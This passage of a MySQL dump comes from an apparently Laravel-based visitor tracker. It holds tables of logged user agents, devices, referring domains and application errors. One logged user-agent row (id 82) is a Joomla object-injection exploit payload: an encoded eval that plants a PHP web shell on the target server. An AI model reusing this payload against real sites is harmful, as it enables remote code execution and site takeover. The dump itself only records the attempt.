Chrome/56.4.9318.4680 Safari/534.42 OPR/44.5.0130.5403','Opera','44.5.0130','2018-01-04 07:09:10','2018-01-04 07:09:10','b15d1419fd7ce4cb1734e88f0bcfe9354b9ed2ff0db8c73efb495b96bd2704c4'),(76,'Mozilla/5.0 (Linux; Android 6.0; LG-H960 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Chrome Mobile','62.0.3202','2018-01-04 16:03:20','2018-01-04 16:03:20','169eb3deabcf6fb9becb42d91055225700fdfe175baec00adcaac355d4aa74be'),(77,'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)','Exabot','3.0','2018-01-04 16:08:53','2018-01-04 16:08:53','c51fdf5bbbff4ab757581a104c4327ff2dc134acca09030755ab8b347300fe56'),(78,'Mozilla/5.0 (compatible; DeuSu/5.0.2; +https://deusu.de/robot.html)','robot','','2018-01-04 21:22:01','2018-01-04 21:22:01','22a824c943b12efbb3ba5b3f91a57725f43ed70da327eee158ad6965cc4ead8d'),(79,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.13014 YaBrowser/13.12.1599.13014 Safari/537.36','Yandex Browser','13.12.1599','2018-01-04 21:30:27','2018-01-04 21:30:27','9ad55ddb3ac684b308a16b4387f5c5e62bc02de963522bfc178f5fe09a855469'),(80,'Mozilla/37.0.2 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)','IE','6.0','2018-01-05 06:07:15','2018-01-05 06:07:15','2820d136a2825a12aa1f08266cb5f5bab20bd892dddf42fd72ea714aaf05cf45'),(81,'Netscape/20.19 (Edubuntu 7.5; hr_HR;)','Netscape','20.19','2018-01-05 06:50:14','2018-01-05 06:50:14','b22938ec403f5fe0a2377be3eade90f2de6b5bb99012125f586563b97fd553bc'),(82,'}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:168:\"eval(base64_decode(ZmlsZV9wdXRfY29udGVudHMoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4nLy5pbmRleC5waHAnLCc8P3BocCBAZXZhbCgkX1JFUVVFU1RbeG9dKTsnKTs));JFactory::getConfig();exit;\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}????','SimplePie','','2018-01-05 06:50:17','2018-01-05 06:50:17','dd3e3e02bd21711ebb4f5210485b29139587ae0d379442e2b94fc771fd3bad08'),(83,'B-l-i-t-z-B-O-T/8.6 (Android 2.8; de_AT;)','Android','2.8','2018-01-05 06:50:18','2018-01-05 06:50:18','8485a573c673c6bb40e264006a7de374311ccbb6b989024ff662721bfe5aa12e'),(84,'GNU IceCat/5.5 (iPad 3.1; en-US;)','IceCat','5.5','2018-01-05 06:53:40','2018-01-05 06:53:40','f89d99fa431790c3696c27f2bf24d0d5baf614f3c0499117e186dd659b031f19'),(85,'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0','Firefox','50.0','2018-01-05 09:01:22','2018-01-05 09:01:22','37067cc48d84d4f1c8c40be0707f297b50099b83bdea1c276b18a62a55543b84'),(86,'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.1144','Opera','43.0.2442','2018-01-05 09:36:40','2018-01-05 09:36:40','0eabab2f5e98b1ae0e3a9b58587425277ac8d0abfdbdcb139a1827414fb38b20'),(87,'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','Chrome','41.0.2228','2018-01-05 14:39:09','2018-01-05 14:39:09','a397c678b4ecdb4d689ecf1b8ab9ad170ab223ca8000eacd2e84fbcff74c39c5'),(88,'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0','Firefox','51.0','2018-01-05 17:06:38','2018-01-05 17:06:38','390063524044515b74bb297792f426ceab30e931ad0eb337e9f466e8c613a971'),(89,'Mozilla/5.0 (compatible; spbot/5.0.3; +http://OpenLinkProfiler.org/bot )','spbot','5.0.3','2018-01-05 19:58:27','2018-01-05 19:58:27','0cf351ec972324b4b01ad7638e2e0a7ee52b6978b93850ed5650d7ccf4b43e0b'),(90,'Mozilla/5.0 (compatible; YaK/1.0; http://linkfluence.com/; bot@linkfluence.com)','; bot','','2018-01-05 22:17:10','2018-01-05 22:17:10','a0c9bf751fff5122118128db85c54e36a8d5046a24d5a9aef1adaf7dd91cc3e8'),(91,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36','Chrome','44.0.2403','2018-01-06 00:05:28','2018-01-06 00:05:28','45923be581353a9518bb47f1abbad2f5e218f20ce1759a811d209be219f090e7'),(92,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)','SurveyBot','2.3','2018-01-06 01:29:37','2018-01-06 01:29:37','6a4764bedc513cb4daacb2a111532f79b145b3560fb7847be78ffcc92f730fa4'),(93,'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0','Firefox','54.0','2018-01-06 02:04:15','2018-01-06 02:04:15','295a28eda0b21e36dc7a2b5a580d2ca7b8a85c9f2a764c09ff708de51d5d5fb8'),(94,'Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0','Firefox','34.0','2018-01-06 05:14:14','2018-01-06 05:14:14','62f988f7b494d9caa0fc2cda31275fbde31c38943b06e327dfec30e3b2967568'),(95,'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0','Firefox','57.0','2018-01-06 08:58:45','2018-01-06 08:58:45','febd6dc3bdd79b607a3eca7417c51a3c119686dec52e3d89396cf0e0452f0822'),(96,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36','Chrome','42.0.2311','2018-01-06 11:26:09','2018-01-06 11:26:09','f9287670ce0ff1190a548875d481ff74e19a94677ad58bb6fa54173cd638763e'),(97,'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2874.30 Safari/537.36','Chrome','54.0.2874','2018-01-06 15:14:49','2018-01-06 15:14:49','b6eabda205fe03c412777edb45bfa1d33cffb25c39cea7ab9f0dd579a37d3f4a'),(98,'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36','Chromium','63.0.3239','2018-01-07 01:09:24','2018-01-07 01:09:24','c86b728c5e8971a0a17f7e2d78504ba1d5df8f731ed9dcb3df65a0914df54e44'),(99,'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31','Chrome','26.0.1410','2018-01-07 14:05:46','2018-01-07 14:05:46','f68f74d3072b154f9bb88f5bb9c590bf5542eab5b37d31c1905d0d7a4bc03388'),(100,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.840 Yowser/2.5 Safari/537.36','Yandex Browser','17.3.1','2018-01-07 15:01:19','2018-01-07 15:01:19','86a8a459038a6115d2e5b2833f127c2c3db7f82c6534b127b31c8dffa0b22009'),(101,'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36','Chrome','62.0.3202','2018-01-07 17:12:40','2018-01-07 17:12:40','6885c6e4273db063cd013f860bc337b8a8193dabc78e352166a1b001bb7760c1'),(102,'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:26.0) Gecko/20100101 Firefox/26.0','Firefox','26.0','2018-01-07 21:14:43','2018-01-07 21:14:43','61fc100f39c0c6235a4c0bcf659f7334fa6deafaa70eb9db64d443c1695b1082'),(103,'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.4) Gecko/20100625 Gentoo Firefox/3.6.4','Firefox','3.6.4','2018-01-08 01:10:08','2018-01-08 01:10:08','9e065f098b02d170fc974c59b540cd470cec3bd1dfd8377527da3b8dc5ac5511'),(104,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36','Chrome','54.0.2840','2018-01-08 02:47:18','2018-01-08 02:47:18','72e36a605f1ca443ec1de677e478e169e86a7896f8375421048478af963ff143'),(105,'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)','IE','8.0','2018-01-08 05:10:37','2018-01-08 05:10:37','e59e1c126d6c0d16a39380340c00aba48e606e558fee6bb243fbb3ba3ecf3214'),(106,'Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36','Android','5.0.2','2018-01-08 07:12:50','2018-01-08 07:12:50','5fd7d77351c0c74abfa506dbc0d816998bb2561280a76d2ec23eb0a1161758df'),(107,'CRAZYWEBCRAWLER 0.9.10, http://www.crazywebcrawler.com','CRAZYWEBCRAWLER','0.9.10','2018-01-08 10:18:13','2018-01-08 10:18:13','74fd61247ff40fa00187c8ce93c20058f813b67989c9cc5951b8d63a7bffdfdc'),(108,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','Chrome','63.0.3239','2018-01-08 12:45:27','2018-01-08 12:45:27','670234b92d8a2cdc6e4fc580c790a1c83f40946a4452239fd47fca71cc45c439'),(109,'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0','Firefox','48.0','2018-01-09 03:26:37','2018-01-09 03:26:37','76230cb104b95f3bd716f0b52b767a8e4ebcd52115636cf69ce74eb2281110be');
/*!40000 ALTER TABLE `tracker_agents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_connections`
--

DROP TABLE IF EXISTS `tracker_connections`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_connections` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_connections_name_index` (`name`),
  KEY `tracker_connections_created_at_index` (`created_at`),
  KEY `tracker_connections_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_connections`
--

LOCK TABLES `tracker_connections` WRITE;
/*!40000 ALTER TABLE `tracker_connections` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_connections` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_cookies`
--

DROP TABLE IF EXISTS `tracker_cookies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_cookies` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `uuid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `tracker_cookies_uuid_unique` (`uuid`),
  KEY `tracker_cookies_created_at_index` (`created_at`),
  KEY `tracker_cookies_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_cookies`
--

LOCK TABLES `tracker_cookies` WRITE;
/*!40000 ALTER TABLE `tracker_cookies` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_cookies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_devices`
--

DROP TABLE IF EXISTS `tracker_devices`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_devices` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `kind` varchar(16) COLLATE utf8_unicode_ci NOT NULL,
  `model` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `platform` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `platform_version` varchar(16) COLLATE utf8_unicode_ci NOT NULL,
  `is_mobile` tinyint(1) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `tracker_devices_kind_model_platform_platform_version_unique` (`kind`,`model`,`platform`,`platform_version`),
  KEY `tracker_devices_kind_index` (`kind`),
  KEY `tracker_devices_model_index` (`model`),
  KEY `tracker_devices_platform_index` (`platform`),
  KEY `tracker_devices_platform_version_index` (`platform_version`),
  KEY `tracker_devices_created_at_index` (`created_at`),
  KEY `tracker_devices_updated_at_index` (`updated_at`)
) ENGINE=InnoDB AUTO_INCREMENT=33 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_devices`
--

LOCK TABLES `tracker_devices` WRITE;
/*!40000 ALTER TABLE `tracker_devices` DISABLE KEYS */;
INSERT INTO `tracker_devices` VALUES (1,'Computer','0','Ubuntu','',0,'2017-12-26 10:50:42','2017-12-26 10:50:42'),(2,'Tablet','iPad','iOS','7.1.1',1,'2017-12-25 10:50:42','2017-12-25 10:50:42'),(3,'Mobile','iPhone','iOS','7.1.1',1,'2017-12-25 10:50:42','2017-12-25 10:50:42'),(5,'Computer','Bot','Other','',0,'2017-12-26 10:28:07','2017-12-26 10:28:07'),(6,'Computer','0','Windows','7',0,'2017-12-26 15:00:11','2017-12-26 15:00:11'),(7,'Computer','0','Windows','',0,'2017-12-26 20:05:43','2017-12-26 20:05:43'),(8,'Computer','0','Linux','',0,'2017-12-27 01:11:32','2017-12-27 01:11:32'),(9,'Computer','WebKit','Windows','7',0,'2017-12-27 02:03:25','2017-12-27 02:03:25'),(10,'Computer','0','Windows','XP',0,'2017-12-27 03:06:46','2017-12-27 03:06:46'),(11,'Computer','WebKit','Windows','10',0,'2017-12-27 03:45:16','2017-12-27 03:45:16'),(12,'Computer','WebKit','Linux','',0,'2017-12-27 07:37:52','2017-12-27 07:37:52'),(13,'Computer','Macintosh','Mac OS X','10.12.6',0,'2017-12-28 13:03:57','2017-12-28 13:03:57'),(14,'Computer','0','Windows','8',0,'2017-12-28 19:18:58','2017-12-28 19:18:58'),(15,'Phone','iPhone','iOS','7.0',1,'2017-12-28 19:51:46','2017-12-28 19:51:46'),(16,'Computer','0','Windows','Vista',0,'2017-12-29 00:12:49','2017-12-29 00:12:49'),(17,'Phone','Nexus','Android','6.0.1',1,'2017-12-29 05:45:01','2017-12-29 05:45:01'),(18,'Computer','WebKit','Windows','8.1',0,'2017-12-29 13:26:51','2017-12-29 13:26:51'),(19,'Computer','0','Windows 2000','',0,'2017-12-30 04:26:19','2017-12-30 04:26:19'),(20,'Phone','WebKit','Android','6.0.1',1,'2017-12-30 15:45:40','2017-12-30 15:45:40'),(21,'Computer','Macintosh','Mac OS X','10.12.5',0,'2017-12-30 20:54:56','2017-12-30 20:54:56'),(22,'Computer','0','CentOS','',0,'2017-12-31 00:51:21','2017-12-31 00:51:21'),(23,'Computer','WebKit','Windows','XP',0,'2017-12-31 09:43:39','2017-12-31 09:43:39'),(24,'Computer','WebKit','Windows','8',0,'2018-01-03 00:28:23','2018-01-03 00:28:23'),(25,'Phone','WebKit','Android','6.0',1,'2018-01-04 16:03:20','2018-01-04 16:03:20'),(26,'Phone','0','Android','2.8',1,'2018-01-05 06:50:18','2018-01-05 06:50:18'),(27,'Tablet','iPad','Other','',1,'2018-01-05 06:53:40','2018-01-05 06:53:40'),(28,'Computer','Macintosh','Mac OS X','10.10.3',0,'2018-01-06 00:05:28','2018-01-06 00:05:28'),(29,'Computer','WebKit','Ubuntu','',0,'2018-01-07 01:09:24','2018-01-07 01:09:24'),(30,'Computer','0','Gentoo','',0,'2018-01-08 01:10:08','2018-01-08 01:10:08'),(31,'Computer','Macintosh','Mac OS X','10.11.6',0,'2018-01-08 02:47:18','2018-01-08 02:47:18'),(32,'Phone','WebKit','Android','5.0.2',1,'2018-01-08 07:12:50','2018-01-08 07:12:50');
/*!40000 ALTER TABLE `tracker_devices` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_domains`
--

DROP TABLE IF EXISTS `tracker_domains`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_domains` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_domains_name_index` (`name`),
  KEY `tracker_domains_created_at_index` (`created_at`),
  KEY `tracker_domains_updated_at_index` (`updated_at`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_domains`
--

LOCK TABLES `tracker_domains` WRITE;
/*!40000 ALTER TABLE `tracker_domains` DISABLE KEYS */;
INSERT INTO `tracker_domains` VALUES (1,'test.app','2017-12-26 10:50:42','2017-12-26 10:50:42'),(2,'saeednasiri.com','2017-12-26 10:06:00','2017-12-26 10:06:00'),(3,'google.com','2017-12-27 03:45:16','2017-12-27 03:45:16'),(4,'zeema.org','2017-12-27 05:07:58','2017-12-27 05:07:58'),(5,'alirezaghorbani.com','2017-12-27 07:52:35','2017-12-27 07:52:35'),(6,'co.uk','2017-12-29 15:30:11','2017-12-29 15:30:11'),(7,'uptime-as.net','2017-12-29 17:25:07','2017-12-29 17:25:07'),(8,'uptime-us.net','2017-12-30 02:13:14','2017-12-30 02:13:14'),(9,'uptime-eu.net','2017-12-31 01:59:03','2017-12-31 01:59:03'),(10,'buron.pw','2018-01-05 09:36:40','2018-01-05 09:36:40'),(11,'domaintools.com','2018-01-06 01:29:37','2018-01-06 01:29:37'),(12,'thewaysband.com','2018-01-06 08:58:45','2018-01-06 08:58:45'),(13,'nbp.pw','2018-01-07 15:01:19','2018-01-07 15:01:19');
/*!40000 ALTER TABLE `tracker_domains` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_errors`
--

DROP TABLE IF EXISTS `tracker_errors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_errors` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `code` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `message` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_errors_code_index` (`code`),
  KEY `tracker_errors_message_index` (`message`),
  KEY `tracker_errors_created_at_index` (`created_at`),
  KEY `tracker_errors_updated_at_index` (`updated_at`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_errors`
--

LOCK TABLES `tracker_errors` WRITE;
/*!40000 ALTER TABLE `tracker_errors` DISABLE KEYS */;
INSERT INTO `tracker_errors` VALUES (1,'404','','2017-12-26 11:05:41','2017-12-26 11:05:41'),(2,'64','Declaration of App\\User::can($route) must be compatible with Illuminate\\Contracts\\Auth\\Access\\Authorizable::can($ability, $arguments = Array)','2017-12-26 11:19:43','2017-12-26 11:19:43'),(3,NULL,'This cache store does not support tagging. (View: /home/vagrant/code/test/resources/views/blogs/show.blade.php)','2017-12-26 11:28:55','2017-12-26 11:28:55'),(4,'2','require_once(/home/vagrant/code/test/App/Helpers/GeneralHelper.php): failed to open stream: No such file or directory','2017-12-26 11:36:03','2017-12-26 11:36:03'),(5,'64','App\\Providers\\AppServiceProvider::boot(): Failed opening required \'/home/vagrant/code/test/App/Helpers/GeneralHelper.php\' (include_path=\'.:/usr/share/php\')','2017-12-26 11:36:03','2017-12-26 11:36:03'),(6,'2','require_once(/home/vagrant/code/test/App/Helpers/Helper.php): failed to open stream: No such file or directory','2017-12-26 11:37:02','2017-12-26 11:37:02'),(7,'64','App\\Providers\\AppServiceProvider::boot(): Failed opening required \'/home/vagrant/code/test/App/Helpers/Helper.php\' (include_path=\'.:/usr/share/php\')','2017-12-26 11:37:02','2017-12-26 11:37:02'),(8,NULL,'Command \"cache:list\" is not defined.\n\nDid you mean one of these?\n    route:list\n    queue:listen\n    make:listener\n    cache:clear\n    cache:table','2017-12-26 12:06:31','2017-12-26 12:06:31'),(9,NULL,'Unauthenticated.','2017-12-27 08:57:34','2017-12-27 08:57:34'),(10,'23000','SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry \'0023b7aecba1d84106d13922237811c7918e9b7fee24bb46322a6cf32fdef9e8\' for key \'tracker_agents_name_hash_unique\' (SQL: insert into `tracker_agents` (`name`, `browser`, `browser_version`, `n','2017-12-28 07:45:49','2017-12-28 07:45:49'),(11,'HY000','SQLSTATE[HY000]: General error: 1615 Prepared statement needs to be re-prepared (SQL: select * from `tracker_referers` where `tracker_referers`.`id` = 11 limit 1)','2017-12-31 09:43:39','2017-12-31 09:43:39'),(12,'405','','2017-12-31 09:43:43','2017-12-31 09:43:43'),(13,NULL,'This cache store does not support tagging.','2017-12-31 09:57:26','2017-12-31 09:57:26'),(14,'42000','SQLSTATE[42000]: Syntax error or access violation: 1055 \'saeednas_db.tracker_sessions.id\' isn\'t in GROUP BY (SQL: select `tracker_sessions`.`id`, `tracker_agents`.`browser`, COUNT(tracker_sessions.id) as deviceCount from `tracker_sessions` inner join `tra','2018-01-01 16:24:51','2018-01-01 16:24:51'),(15,'42000','SQLSTATE[42000]: Syntax error or access violation: 1055 \'saeednas_db.tracker_agents.browser\' isn\'t in GROUP BY (SQL: select `tracker_agents`.`browser`, COUNT(tracker_sessions.id) as deviceCount, CASE WHEN browser = \"Firefox\" THEN \"Firefox\"WHEN browser = \"','2018-01-01 16:36:58','2018-01-01 16:36:58'),(16,NULL,'Method dd does not exist.','2018-01-01 16:38:02','2018-01-01 16:38:02'),(17,'2','unlink(/home/saeednas/public_html/storage/framework/cache/b2/ce/b2ceb6511d6c63989d1d289ed8a4bb4bad59c591): No such file or directory','2018-01-04 06:33:43','2018-01-04 06:33:43'),(18,NULL,'Class \'App\\Forms\\Comment\' not found','2018-01-07 01:12:05','2018-01-07 01:12:05');
/*!40000 ALTER TABLE `tracker_errors` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_events`
--

DROP TABLE IF EXISTS `tracker_events`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_events` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_events_name_index` (`name`),
  KEY `tracker_events_created_at_index` (`created_at`),
  KEY `tracker_events_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_events`
--

LOCK TABLES `tracker_events` WRITE;
/*!40000 ALTER TABLE `tracker_events` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_events` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_events_log`
--

DROP TABLE IF EXISTS `tracker_events_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_events_log` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `event_id` bigint(20) unsigned NOT NULL,
  `class_id` bigint(20) unsigned DEFAULT NULL,
  `log_id` bigint(20) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_events_log_event_id_index` (`event_id`),
  KEY `tracker_events_log_class_id_index` (`class_id`),
  KEY `tracker_events_log_log_id_index` (`log_id`),
  KEY `tracker_events_log_created_at_index` (`created_at`),
  KEY `tracker_events_log_updated_at_index` (`updated_at`),
  CONSTRAINT `tracker_events_log_class_id_foreign` FOREIGN KEY (`class_id`) REFERENCES `tracker_system_classes` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_events_log_event_id_foreign` FOREIGN KEY (`event_id`) REFERENCES `tracker_events` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_events_log_log_id_foreign` FOREIGN KEY (`log_id`) REFERENCES `tracker_log` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_events_log`
--

LOCK TABLES `tracker_events_log` WRITE;
/*!40000 ALTER TABLE `tracker_events_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_events_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_geoip`
--

DROP TABLE IF EXISTS `tracker_geoip`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_geoip` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `latitude` double DEFAULT NULL,
  `longitude` double DEFAULT NULL,
  `country_code` varchar(2) COLLATE utf8_unicode_ci DEFAULT NULL,
  `country_code3` varchar(3) COLLATE utf8_unicode_ci DEFAULT NULL,
  `country_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `region` varchar(2) COLLATE utf8_unicode_ci DEFAULT NULL,
  `city` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `postal_code` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `area_code` bigint(20) DEFAULT NULL,
  `dma_code` double DEFAULT NULL,
  `metro_code` double DEFAULT NULL,
  `continent_code` varchar(2) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_geoip_latitude_index` (`latitude`),
  KEY `tracker_geoip_longitude_index` (`longitude`),
  KEY `tracker_geoip_country_code_index` (`country_code`),
  KEY `tracker_geoip_country_code3_index` (`country_code3`),
  KEY `tracker_geoip_country_name_index` (`country_name`),
  KEY `tracker_geoip_city_index` (`city`),
  KEY `tracker_geoip_created_at_index` (`created_at`),
  KEY `tracker_geoip_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_geoip`
--

LOCK TABLES `tracker_geoip` WRITE;
/*!40000 ALTER TABLE `tracker_geoip` DISABLE KEYS */;
